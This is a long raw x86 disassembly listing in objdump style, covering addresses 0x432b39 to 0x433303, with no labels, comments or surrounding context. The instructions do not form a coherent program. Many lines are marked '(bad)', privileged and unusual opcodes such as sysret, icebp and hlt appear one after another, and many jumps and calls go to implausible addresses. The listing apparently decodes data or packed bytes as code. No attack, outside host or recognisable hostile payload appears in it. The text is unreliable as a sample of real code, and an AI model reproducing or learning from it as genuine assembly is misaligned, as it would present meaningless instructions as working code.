  432b39:	mov    ebp,DWORD PTR [eax]
  432b3b:	clc    
  432b3c:	retf   0xff54
  432b3f:	push   ecx
  432b40:	mov    DWORD PTR ds:0x757210,eax
  432b46:	mov    ecx,DWORD PTR [ebp-0x4]
  432b49:	sub    esp,DWORD PTR [ebx-0x77]
  432b4c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432b53:	or     ah,bh
  432b55:	pop    es
  432b56:	ds fwait
  432b58:	push   DWORD PTR [edx]
  432b5a:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432b60:	(bad)  
  432b61:	mov    bh,bh
  432b63:	jmp    0x432b51
  432b65:	leave  
  432b66:	jne    0x432b70
  432b68:	call   0x3024c2
  432b6d:	in     al,dx
  432b6e:	dec    ebp
  432b6f:	add    dh,BYTE PTR [ebx]
  432b71:	add    BYTE PTR [ebx],al
  432b73:	inc    ebp
  432b74:	cmp    esi,DWORD PTR [ecx]
  432b76:	je     0x432b14
  432b78:	mov    eax,edi
  432b7a:	or     al,0xf0
  432b7c:	add    BYTE PTR [ebp+0x458bf845],al
  432b82:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b88:	adc    al,0x7
  432b8a:	enter  0x9fc0,0xa5
  432b8e:	rol    BYTE PTR [eax],0x5e
  432b91:	mov    ecx,ecx
  432b93:	or     al,0xc
  432b95:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b9c:	jmp    0x432b9d
  432b9e:	push   ebp
  432b9f:	mov    esp,ebp
  432ba1:	cld    
  432ba2:	inc    ebp
  432ba3:	inc    ebp
  432ba4:	or     DWORD PTR [ecx+0x457dec10],0x0
  432bab:	push   esi
  432bac:	push   esi
  432bad:	mov    edi,0x7af080f
  432bb2:	add    bh,al
  432bb4:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432bba:	add    BYTE PTR [ecx+0x4540100f],cl
  432bc0:	mov    ebp,eax
  432bc2:	mov    ebp,edi
  432bc4:	lock call edx
  432bc7:	fcom   DWORD PTR [ebp+0x45]
  432bca:	mov    eax,0x148a8b
  432bcf:	push   ecx
  432bd0:	enter  0xc145,0x83
  432bd4:	cmp    ecx,DWORD PTR [eax]
  432bd6:	add    BYTE PTR [ebp+0x4d],al
  432bd9:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432bdf:	call   0xffa3274e
  432be4:	cmp    eax,DWORD PTR [ebp-0xc]
  432be7:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432beb:	push   ebp
  432bec:	(bad)  
  432bed:	call   0x3429f1
  432bf2:	mov    bh,0xdb
  432bf4:	cld    
  432bf5:	or     BYTE PTR [ebp+0x45],bl
  432bf8:	(bad)  
  432bf9:	call   0xff7d2889
  432bfe:	add    al,BYTE PTR [ebp+0x37]
  432c01:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432c07:	jne    0x432c09
  432c09:	(bad)  
  432c0a:	cmp    edi,esp
  432c0c:	jne    0x432c3f
  432c0e:	mov    edi,edi
  432c10:	or     BYTE PTR [ebx-0x307f0b49],cl
  432c16:	pop    ds
  432c17:	into   
  432c18:	je     0x432bdb
  432c1a:	mov    ebx,DWORD PTR [esi]
  432c1c:	or     BYTE PTR [ebp-0x49],al
  432c1f:	mov    esp,DWORD PTR [esi-0x77]
  432c22:	mov    esi,0x2451f0c
  432c27:	mov    eax,DWORD PTR [eax]
  432c29:	or     al,0x66
  432c2b:	sar    bl,0x3b
  432c2e:	xor    esi,DWORD PTR [ebp+0x66]
  432c31:	xor    ecx,edi
  432c33:	pop    edi
  432c34:	adc    bl,BYTE PTR [ebx+0x7e]
  432c37:	ret    0xff
  432c3a:	cld    
  432c3b:	inc    ebp
  432c3c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432c42:	cld    
  432c43:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432c4a:	push   0xffffff83
  432c4c:	pop    edi
  432c4d:	or     BYTE PTR [ebp+0x53],dh
  432c50:	xorps  xmm1,xmm2
  432c53:	test   BYTE PTR [eax+eax*1],bh
  432c56:	add    BYTE PTR [eax],al
  432c58:	adc    eax,eax
  432c5a:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432c62:	jmp    DWORD PTR [eax]
  432c64:	ror    al,0x5e
  432c67:	inc    ebp
  432c68:	leave  
  432c69:	xor    ecx,DWORD PTR [eax]
  432c6b:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432c71:	add    ah,al
  432c73:	xor    edi,edi
  432c75:	xor    DWORD PTR [ebx],0x66003302
  432c7b:	mov    DWORD PTR [ebp-0xc],ecx
  432c7e:	pcmpgtw mm0,mm0
  432c81:	add    dl,ah
  432c83:	leave  
  432c84:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c88:	push   eax
  432c89:	dec    ebp
  432c8a:	mov    esi,DWORD PTR [ebx-0x75]
  432c8d:	lea    ebp,[eax-0x7c00ff02]
  432c93:	xor    eax,DWORD PTR [eax]
  432c95:	sysret 
  432c97:	dec    ebp
  432c98:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c9f:	push   WORD PTR [ecx+0x8]
  432ca3:	jne    0x432c66
  432ca5:	ud0    ecx,DWORD PTR [ecx]
  432ca8:	mov    eax,edx
  432caa:	lods   al,BYTE PTR ds:[esi]
  432cab:	add    BYTE PTR [eax],al
  432cad:	data16 (bad) 
  432caf:	iret   
  432cb0:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432cb7:	cli    
  432cb8:	inc    ebp
  432cb9:	cmp    al,0x8d
  432cbb:	add    BYTE PTR [esi+0x2d],ah
  432cbe:	inc    ebp
  432cbf:	pop    ebp
  432cc0:	lea    ecx,[edi]
  432cc2:	mov    dl,bh
  432cc4:	add    BYTE PTR [edi],cl
  432cc6:	mov    DWORD PTR [eax+eax*8],edi
  432cc9:	mov    ebx,0x3b87
  432cce:	add    BYTE PTR [ebx],ch
  432cd0:	inc    ebp
  432cd1:	data16 (bad) 
  432cd3:	clc    
  432cd4:	int3   
  432cd5:	cmp    eax,DWORD PTR [eax]
  432cd7:	je     0x432c62
  432cd9:	push   0xffffffc8
  432cdb:	pop    edi
  432cdc:	xchg   DWORD PTR [ebp+0x0],eax
  432cdf:	data16 add BYTE PTR [ebp+0x45],cl
  432ce3:	lea    cx,[ebp+0x10]
  432ce7:	jb     0x432ce9
  432ce9:	jmp    0x432c74
  432ceb:	call   eax
  432ced:	clc    
  432cee:	xchg   DWORD PTR [edi+0x1],edi
  432cf1:	mov    eax,DWORD PTR [eax]
  432cf3:	or     BYTE PTR [ebp-0x49],al
  432cf6:	lea    eax,[eax+0x74003154]
  432cfc:	push   edi
  432cfd:	inc    edx
  432cfe:	jge    0x432cff
  432d00:	mov    DWORD PTR [edi],ecx
  432d02:	fdiv   DWORD PTR [edi-0x6]
  432d05:	inc    DWORD PTR [eax]
  432d07:	xor    edx,DWORD PTR [eax+0x5f]
  432d0a:	xchg   DWORD PTR [ebx+0x1],ebx
  432d0d:	ret    0x0
  432d10:	xor    BYTE PTR [ebp-0x51],cl
  432d13:	cmp    edi,0xf0ff89fe
  432d19:	data16 ror al,0x84
  432d1d:	rol    BYTE PTR [eax],0x3b
  432d20:	add    al,dh
  432d22:	dec    eax
  432d23:	xchg   esp,eax
  432d24:	push   ebx
  432d25:	jmp    0x432cb2
  432d27:	push   ebp
  432d28:	add    esp,ebp
  432d2a:	add    ebp,esp
  432d2c:	mov    edx,DWORD PTR [edi+0x24]
  432d2f:	clc    
  432d30:	dec    esi
  432d31:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432d37:	cmp    BYTE PTR [ebx],al
  432d39:	jne    0x432cc4
  432d3b:	xor    esp,eax
  432d3d:	jmp    0x462ec0
  432d42:	add    ebp,DWORD PTR [ecx+ecx*4]
  432d45:	jne    0x432d3b
  432d47:	call   0xffcd2aa1
  432d4c:	clc    
  432d4d:	xchg   edi,eax
  432d4e:	sti    
  432d4f:	add    DWORD PTR [ebx],eax
  432d51:	add    BYTE PTR [ebp+0x47],bl
  432d54:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432d5a:	pop    ebp
  432d5b:	mov    DWORD PTR [esi-0x48],esi
  432d5e:	jmp    0x432da7
  432d60:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432d66:	(bad)  
  432d68:	cmp    al,0x0
  432d6a:	cmp    eax,DWORD PTR [ebp+0x18]
  432d6d:	lea    ebx,[ebp-0x56]
  432d70:	jle    0x432d72
  432d72:	jae    0x432cfd
  432d74:	mov    eax,esp
  432d76:	call   0xb900:0x8b005587
  432d7d:	inc    ebp
  432d7e:	push   ebp
  432d7f:	lea    ecx,[ebp-0x27ff4f12]
  432d85:	mov    eax,edi
  432d87:	int3   
  432d88:	push   ebp
  432d89:	xchg   edi,eax
  432d8b:	add    esp,ebp
  432d8d:	add    BYTE PTR [eax],al
  432d8f:	inc    ebp
  432d90:	add    BYTE PTR [ebp+0x8b3255],cl
  432d96:	cld    
  432d97:	mov    DWORD PTR [edx],edi
  432d99:	aam    0x75
  432d9b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432da1:	mov    DWORD PTR [ebx-0x50],edx
  432da4:	test   BYTE PTR [ebp-0x1],0xe8
  432da8:	mov    eax,DWORD PTR [eax]
  432daa:	hlt    
  432dab:	add    al,al
  432dad:	mov    eax,DWORD PTR ds:0x890045a8
  432db3:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432db9:	inc    DWORD PTR [eax*2+0xf75854d]
  432dc0:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432dc6:	call   0x72998b07
  432dcb:	je     0x432e2b
  432dcd:	js     0x432e2e
  432dcf:	lock ret 0x7e
  432dd3:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432dd9:	mov    edi,edi
  432ddb:	sbb    al,bl
  432ddd:	clc    
  432dde:	add    BYTE PTR [ebp-0x73],bh
  432de1:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432de7:	ror    BYTE PTR [eax],1
  432de9:	dec    ebp
  432dea:	xchg   ebp,eax
  432deb:	mov    edi,edi
  432ded:	in     al,0x8b
  432def:	jge    0x432d7a
  432df1:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432df7:	clc    
  432df8:	pop    esi
  432df9:	fist   DWORD PTR [ebp+0x5d398b5d]
  432dff:	clc    
  432e00:	add    al,0x6e
  432e02:	mov    eax,DWORD PTR [ebx]
  432e04:	mov    BYTE PTR [ebp+0x0],dl
  432e07:	mov    edx,DWORD PTR [ebx-0x20]
  432e0a:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432e10:	add    eax,0x3b3b73
  432e15:	adc    al,0x89
  432e17:	pop    eax
  432e18:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432e1c:	ret    0xf08
  432e1f:	cmp    al,0x2
  432e21:	mov    edx,eax
  432e23:	cld    
  432e24:	add    BYTE PTR [ebp+0x66],dl
  432e27:	add    eax,ebx
  432e29:	add    esp,eax
  432e2b:	sub    eax,eax
  432e2d:	or     BYTE PTR [ecx-0x77f474bb],cl
  432e33:	add    BYTE PTR [eax],al
  432e35:	mov    DWORD PTR [ebx-0x24],ebx
  432e38:	push   edi
  432e39:	push   ebp
  432e3a:	clc    
  432e3b:	add    DWORD PTR [esi+0x1b0100],0x45
  432e42:	out    0xff,eax
  432e44:	add    edx,DWORD PTR [eax]
  432e46:	jmp    0x432e30
  432e48:	cmp    ch,0x46
  432e4b:	(bad)  
  432e4c:	jmp    0x40c8b69e
  432e51:	je     0x432ddd
  432e53:	mov    eax,DWORD PTR [eax-0x10c78104]
  432e59:	inc    ebp
  432e5a:	add    BYTE PTR [ebx-0x770375],al
  432e60:	add    ah,ch
  432e62:	add    edx,esp
  432e64:	pop    edi
  432e65:	pop    ebp
  432e66:	push   ebp
  432e67:	inc    ebx
  432e68:	in     al,dx
  432e69:	pop    ebp
  432e6a:	in     al,dx
  432e6b:	cmp    edx,DWORD PTR [edi-0x8]
  432e6e:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432e75:	add    al,0x47
  432e77:	push   ebp
  432e78:	mov    esp,ebp
  432e7a:	in     al,0x45
  432e7c:	dec    ebp
  432e7d:	push   esi
  432e7e:	test   DWORD PTR [eax+0xfb010f],esi
  432e84:	add    BYTE PTR [eax+0xc018b],dh
  432e8a:	leave  
  432e8b:	inc    ebp
  432e8c:	test   al,ch
  432e8e:	add    dh,bh
  432e90:	add    bh,bh
  432e92:	dec    ebp
  432e93:	push   cs
  432e94:	mov    DWORD PTR [ecx],eax
  432e96:	hlt    
  432e97:	push   es
  432e98:	dec    ebp
  432e99:	leave  
  432e9a:	mov    DWORD PTR [eax],ecx
  432e9c:	clc    
  432e9d:	cmovge eax,ecx
  432ea0:	mov    ecx,0x85c2f0
  432ea6:	clc    
  432ea7:	pop    DWORD PTR [ebp+0x1]
  432eaa:	push   ebx
  432eab:	add    BYTE PTR [ebp-0x15],bh
  432eae:	push   esi
  432eaf:	xor    eax,0x898a45
  432eb4:	cld    
  432eb5:	add    al,BYTE PTR [ebp+0x0]
  432eb8:	xor    esp,DWORD PTR [esi-0x64]
  432ebb:	add    DWORD PTR [esi+0x78308c1],edi
  432ec1:	add    ah,BYTE PTR [ebp-0x49]
  432ec4:	int    0xbb
  432ec6:	mov    ecx,DWORD PTR [esi+0xc]
  432ec9:	add    dh,al
  432ecb:	cmp    ecx,ebx
  432ecd:	jne    0x432e97
  432ecf:	xor    ecx,DWORD PTR [ebp+0x66]
  432ed2:	jmp    0xca2ed8
  432ed7:	add    DWORD PTR [ebp+0x0],eax
  432eda:	mov    eax,ebx
  432edc:	or     al,0x8b
  432ede:	(bad)  
  432edf:	mov    ecx,esi
  432ee1:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432ee8:	mov    eax,edi
  432eea:	or     BYTE PTR [edx],cl
  432eec:	shl    cl,cl
  432eee:	icebp  
  432eef:	add    BYTE PTR [ebp+0x38],0x8b
  432ef3:	or     BYTE PTR [edx+eax*2],cl
  432ef6:	(bad)  
  432ef7:	or     cl,dh
  432ef9:	stc    
  432efa:	shl    DWORD PTR [ebp-0x30],0xc6
  432efe:	xor    al,0x0
  432f00:	inc    ebp
  432f01:	xchg   BYTE PTR [ebx],al
  432f03:	add    esp,edi
  432f05:	add    BYTE PTR [ebp-0x39],cl
  432f08:	mov    al,bl
  432f0a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432f10:	sub    al,0xbf
  432f12:	jmp    0x432e99
  432f14:	mov    edi,eax
  432f16:	lock jge 0x432f0a
  432f19:	lea    esi,[edx-0x74bad5ff]
  432f1f:	mov    ebp,esp
  432f21:	or     cl,dh
  432f23:	leave  
  432f24:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432f2b:	dec    ebp
  432f2c:	dec    ebp
  432f2d:	test   DWORD PTR [ebx],eax
  432f2f:	paddb  mm6,mm0
  432f32:	add    DWORD PTR [eax],eax
  432f34:	dec    ebp
  432f35:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432f3b:	mov    esi,DWORD PTR [edx]
  432f3d:	or     al,0x2b
  432f3f:	dec    ebp
  432f40:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432f46:	mov    esp,edi
  432f48:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432f4f:	mov    DWORD PTR [ebx],ebp
  432f51:	call   0xc76b881
  432f56:	mov    DWORD PTR [ebp+0x10],ecx
  432f59:	(bad)  
  432f5a:	push   0x8b85ff10
  432f5f:	clc    
  432f60:	or     al,0x54
  432f62:	(bad)  
  432f63:	push   ecx
  432f64:	retf   
  432f65:	mov    ebx,0xff4d8dc8
  432f6a:	mov    DWORD PTR [ebp+0x8],eax
  432f6d:	xor    eax,DWORD PTR [ebp-0x75]
  432f70:	cmp    ebp,DWORD PTR [ebx]
  432f72:	lsl    ebx,WORD PTR [edi-0x8]
  432f76:	call   DWORD PTR [ebx-0x741bff75]
  432f7c:	(bad)  
  432f7d:	or     al,0x5b
  432f7f:	dec    ebp
  432f80:	or     BYTE PTR [ebx],dh
  432f82:	inc    ebp
  432f83:	xor    esi,DWORD PTR ds:0x708088d
  432f89:	in     eax,0x9b
  432f8b:	add    BYTE PTR [edx],dh
  432f8d:	inc    ebp
  432f8e:	pop    edi
  432f8f:	xor    eax,edx
  432f91:	test   DWORD PTR [eax],0x81108b8b
  432f97:	dec    ebp
  432f98:	sub    al,0x33
  432f9a:	add    BYTE PTR [ebx],dh
  432f9c:	push   esi
  432f9d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432fa3:	mov    edi,eax
  432fa5:	or     BYTE PTR [ebp+0x45],al
  432fa8:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432fae:	xor    ecx,ecx
  432fb0:	pushf  
  432fb1:	push   es
  432fb2:	mov    DWORD PTR [esi-0x4],0xf8178538
  432fb9:	dec    ebp
  432fba:	inc    ebp
  432fbb:	cmp    BYTE PTR [ecx],0x54
  432fbe:	pushf  
  432fbf:	gs (bad) 
  432fc1:	shl    esp,1
  432fc3:	dec    ebp
  432fc4:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432fca:	shr    ecx,1
  432fcc:	xlat   BYTE PTR ds:[ebx]
  432fcd:	rol    bh,cl
  432fcf:	mov    edx,esp
  432fd1:	or     BYTE PTR [ebp+0x4588f84d],al
  432fd7:	mov    ecx,DWORD PTR [eax]
  432fd9:	or     BYTE PTR [eax],al
  432fdb:	push   ebp
  432fdc:	mov    edi,DWORD PTR [eax+0xfc728b]
  432fe2:	dec    ebp
  432fe3:	enter  0xceba,0x8
  432fe7:	retf   0x1807
  432fea:	ret    0x9b4d
  432fed:	mov    esi,DWORD PTR [edx]
  432fef:	or     al,0x33
  432ff1:	into   
  432ff2:	add    edx,esi
  432ff4:	add    ecx,edx
  432ff6:	bswap  eax
  432ff8:	ror    esi,0x98
  432ffb:	dec    ebp
  432ffc:	add    cl,ch
  432ffe:	mov    edi,edi
  433000:	hlt    
  433001:	inc    esi
  433003:	inc    ebp
  433004:	ret    0x4533
  433007:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  43300d:	or     BYTE PTR [ebx],dh
  43300f:	dec    ebp
  433010:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433016:	jne    0xff8d2fdd
  43301c:	inc    ebp
  43301d:	inc    ebp
  43301e:	mov    esi,DWORD PTR [ebx]
  433020:	clc    
  433021:	pop    esi
  433022:	ret    0xcaeb
  433025:	mov    eax,esi
  433027:	call   0x520484fa
  43302c:	dec    ebp
  43302d:	add    eax,0xf8728b
  433032:	adc    eax,0xce0ccac9
  433037:	push   ebp
  433038:	ret    0xc6ec
  43303b:	in     al,dx
  43303c:	call   0x33437d45
  433041:	push   edi
  433042:	add    edi,eax
  433044:	xor    eax,eax
  433046:	jmp    0x43308d
  433048:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  43304e:	add    eax,edi
  433050:	shr    eax,cl
  433052:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433058:	mov    esi,DWORD PTR [edx]
  43305a:	in     al,dx
  43305b:	pushf  
  43305c:	ret    0x84c7
  43305f:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  433065:	inc    ebp
  433066:	in     al,dx
  433067:	xor    DWORD PTR [ebp-0x64],eax
  43306a:	mov    eax,edi
  43306c:	cld    
  43306d:	fmul   st(2),st
  43306f:	sbb    dl,al
  433071:	jmp    0x9c3b:0x304d45c1
  433078:	jbe    0x433041
  43307a:	mov    esp,eax
  43307c:	clc    
  43307d:	add    BYTE PTR [ebp+0x0],cl
  433080:	mov    ecx,ecx
  433082:	lea    eax,[ebp-0x5]
  433085:	mov    edi,edi
  433087:	call   0x51ce84d1
  43308c:	hlt    
  43308d:	xor    eax,edx
  43308f:	mov    esi,0x9b7284
  433094:	xor    cl,dl
  433096:	mov    esi,eax
  433098:	hlt    
  433099:	into   
  43309a:	inc    ebp
  43309b:	scas   eax,DWORD PTR es:[edi]
  43309c:	mov    ebp,ecx
  43309e:	cld    
  43309f:	add    dl,cl
  4330a1:	add    dl,al
  4330a3:	inc    ebp
  4330a4:	shr    DWORD PTR [ebx],0x4d
  4330a7:	xor    edi,DWORD PTR [ebx]
  4330a9:	mov    DWORD PTR [edi],ecx
  4330ab:	clc    
  4330ac:	dec    esi
  4330ad:	inc    ebp
  4330ae:	dec    DWORD PTR [ebx-0x3d2b1775]
  4330b4:	ret    0xc6ca
  4330b7:	mov    BYTE PTR [ebp-0x32],0x53
  4330bb:	scas   eax,DWORD PTR es:[edi]
  4330bc:	inc    ebp
  4330bd:	jmp    0x4330ef
  4330bf:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  4330c6:	pop    ebx
  4330c7:	xor    ecx,DWORD PTR [ebp+0x3]
  4330ca:	mov    eax,DWORD PTR [ebx]
  4330cc:	clc    
  4330cd:	test   edx,ecx
  4330cf:	mov    ecx,esi
  4330d1:	cld    
  4330d2:	call   0x8ab7761c
  4330d7:	xor    ecx,DWORD PTR [eax+0x4533f303]
  4330dd:	add    ecx,DWORD PTR [ebx-0x4974072d]
  4330e3:	fdiv   QWORD PTR [ebx]
  4330e5:	retf   0xce89
  4330e8:	in     al,0xc1
  4330ea:	inc    ebp
  4330eb:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  4330f1:	into   
  4330f2:	mov    dh,0xc1
  4330f5:	call   0x8c17767e
  4330fa:	(bad)  
  4330fb:	cld    
  4330fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4330ff:	xor    eax,ecx
  433101:	lea    eax,[ebp+0x8]
  433104:	mov    esi,DWORD PTR [edx-0x4]
  433107:	add    dl,al
  433109:	inc    ebp
  43310a:	mov    esp,0x32d89b8b
  43310f:	dec    ebp
  433110:	mov    esi,DWORD PTR [ebx]
  433112:	cld    
  433113:	xor    eax,edx
  433115:	sub    esp,DWORD PTR [ebp-0x75]
  433118:	int    0xec
  43311a:	sub    ecx,eax
  43311c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  433122:	mov    esi,esp
  433124:	call   0x34177ead
  433129:	inc    DWORD PTR [ebx]
  43312b:	mov    edi,DWORD PTR [ebx]
  43312d:	cld    
  43312e:	jne    0x43317d
  433130:	mov    esi,DWORD PTR [ebx]
  433132:	aam    0x8d
  433134:	dec    ebp
  433135:	or     BYTE PTR [ebx],dh
  433137:	jb     0x43313c
  433139:	add    BYTE PTR [edi+0x45],bl
  43313c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  433143:	xor    ebp,esp
  433145:	xor    eax,edi
  433147:	sub    edi,esp
  433149:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  43314f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433156:	inc    ebp
  433157:	xor    ecx,DWORD PTR [ecx+0x45891403]
  43315d:	clc    
  43315e:	mov    eax,edi
  433160:	nop
  433161:	fadd   QWORD PTR [eax]
  433163:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433169:	jmp    0x4330f4
  43316b:	mov    eax,DWORD PTR [ecx]
  43316d:	fadd   DWORD PTR [eax]
  43316f:	inc    ebp
  433170:	or     DWORD PTR [ebx],esi
  433172:	dec    eax
  433173:	add    edx,DWORD PTR [ebx-0x2d]
  433176:	dec    ebp
  433177:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  43317d:	inc    ebp
  43317e:	push   esp
  43317f:	mov    dl,BYTE PTR [ecx-0xd]
  433182:	xor    ecx,DWORD PTR [ebp-0x45]
  433185:	(bad)  
  433187:	rol    BYTE PTR [eax],0xc1
  43318a:	ret    
  43318b:	inc    ebp
  43318c:	inc    ebp
  43318d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433193:	xor    eax,ebx
  433195:	add    eax,DWORD PTR [ebp+0x23]
  433198:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43319e:	cmp    edi,0xc
  4331a1:	dec    ebp
  4331a2:	inc    ebp
  4331a3:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  4331a9:	inc    ebp
  4331aa:	mov    esi,DWORD PTR [ebx]
  4331ac:	clc    
  4331ad:	lea    eax,[ebp+0x45725407]
  4331b3:	add    BYTE PTR [ebp+eax*2-0x75],dh
  4331b7:	xor    edi,DWORD PTR [eax]
  4331b9:	mov    ecx,0xff8b8d4d
  4331be:	push   esp
  4331bf:	enter  0x4df7,0x23
  4331c3:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  4331c9:	mov    eax,DWORD PTR [ebx]
  4331cb:	loopne 0x4331b8
  4331cd:	ret    0xc68b
  4331d0:	push   esp
  4331d1:	enter  0x9745,0x8b
  4331d5:	inc    ebp
  4331d6:	cld    
  4331d7:	mov    eax,edi
  4331d9:	clc    
  4331da:	ret    
  4331db:	ret    0xc645
  4331de:	mov    esi,DWORD PTR [ebx]
  4331e0:	cld    
  4331e1:	pop    esi
  4331e2:	mov    ebx,0x83458bc3
  4331e8:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4331ec:	dec    ebp
  4331ed:	xor    DWORD PTR [ebx],esi
  4331ef:	pushf  
  4331f0:	add    edi,DWORD PTR [edx-0x7767a77]
  4331f6:	fcom   DWORD PTR [ebp+0x45]
  4331f9:	mov    esi,DWORD PTR [ebx]
  4331fb:	adc    al,0x9c
  4331fd:	inc    ebp
  4331fe:	(bad)  
  4331ff:	mov    ebx,eax
  433201:	adc    al,0x85
  433203:	cmp    al,0x1
  433206:	inc    ebp
  433207:	add    BYTE PTR ds:0xe98b9c4d,bh
  43320d:	mov    eax,DWORD PTR [ebx]
  43320f:	nop
  433210:	add    BYTE PTR [eax],al
  433212:	inc    ebp
  433213:	mov    esi,DWORD PTR [ebx]
  433215:	add    eax,DWORD PTR [ebx]
  433217:	cmp    al,0x89
  433219:	mov    esp,esi
  43321b:	clc    
  43321c:	inc    ebp
  43321d:	inc    ebp
  43321e:	add    edx,DWORD PTR [esi+0xc]
  433221:	mov    edi,0x7ff0845
  433226:	in     al,dx
  433227:	(bad)  
  433228:	jne    0x4331c5
  43322a:	mov    esi,DWORD PTR [edx]
  43322c:	clc    
  43322d:	add    ebp,DWORD PTR [esi]
  43322f:	mov    edi,edi
  433231:	in     al,dx
  433232:	mov    DWORD PTR [ebp-0x10],eax
  433235:	xor    eax,DWORD PTR [ebp+0x3]
  433238:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  43323e:	fmul   DWORD PTR [ebx-0x173caf39]
  433244:	lea    ecx,[ecx+0x45e8d4bc]
  43324a:	clc    
  43324b:	mov    edi,edi
  43324d:	cmp    BYTE PTR [ebp+0x4d],al
  433250:	test   DWORD PTR [eax+0x74],ecx
  433253:	inc    ecx
  433254:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43325a:	ret    
  43325b:	inc    eax
  43325c:	dec    DWORD PTR [ebx+0x4945f8f0]
  433262:	push   eax
  433263:	dec    eax
  433264:	test   al,0xd0
  433266:	dec    eax
  433268:	mov    eax,DWORD PTR [ebp-0x14]
  43326b:	mov    eax,DWORD PTR [ebp+0x38]
  43326e:	mov    eax,ecx
  433270:	fadd   DWORD PTR [ebx]
  433272:	dec    ebp
  433273:	inc    eax
  433274:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  43327a:	inc    ebp
  43327b:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433281:	fadd   QWORD PTR [ebx]
  433283:	inc    ebp
  433284:	or     al,0x33
  433286:	dec    ebp
  433287:	add    edi,DWORD PTR [ebx]
  433289:	mov    DWORD PTR [edx-0x28],esi
  43328c:	mov    eax,DWORD PTR [ebp-0x10]
  43328f:	mov    eax,DWORD PTR [eax+0x10]
  433292:	mov    eax,edi
  433294:	lock ret 
  433296:	inc    ecx
  433297:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43329d:	fsubr  st,st(5)
  43329f:	test   DWORD PTR [eax],eax
  4332a1:	clc    
  4332a2:	push   0x45
  4332a4:	(bad)  
  4332a5:	cmp    al,0xec
  4332a7:	pushf  
  4332a8:	inc    ebp
  4332a9:	(bad)  
  4332aa:	push   eax
  4332ab:	fsub   DWORD PTR [eax-0x7b]
  4332ae:	(bad)  
  4332af:	clc    
  4332b0:	mov    eax,0xf8008584
  4332b5:	mov    eax,DWORD PTR [ebp-0x4]
  4332b8:	mov    edi,0x4585c3cc
  4332be:	clc    
  4332bf:	mov    eax,DWORD PTR [ebp+0x14]
  4332c2:	xor    eax,DWORD PTR [ebp-0x64]
  4332c5:	mov    edi,eax
  4332c7:	in     al,dx
  4332c8:	les    esi,FWORD PTR [ebp-0x7b]
  4332cb:	mov    edi,eax
  4332cd:	or     al,0x4d
  4332cf:	dec    ebp
  4332d0:	mov    eax,ebp
  4332d2:	in     al,0xf2
  4332d4:	dec    ebp
  4332d5:	dec    DWORD PTR [ecx+0x4dc7e045]
  4332db:	fmul   DWORD PTR [ecx+0x4df8f085]
  4332e1:	inc    ebp
  4332e2:	mov    DWORD PTR [ebx],esi
  4332e4:	fadd   QWORD PTR [ebx]
  4332e6:	dec    ebp
  4332e7:	push   eax
  4332e8:	xor    eax,DWORD PTR [ebp+0x3]
  4332eb:	push   eax
  4332ec:	mov    DWORD PTR [eax+ebx*8],ebx
  4332ef:	push   esi
  4332f1:	mov    eax,DWORD PTR [eax]
  4332f3:	lock cmp eax,0xf84e85c0
  4332f9:	inc    ebp
  4332fa:	test   BYTE PTR [ebx],dh
  4332fc:	add    DWORD PTR [ebx],eax
  4332fe:	add    BYTE PTR [eax+0x4d],dl
  433301:	jne    0x433336
  433303:	lea    ecx,[ebx-0x7617fc44]
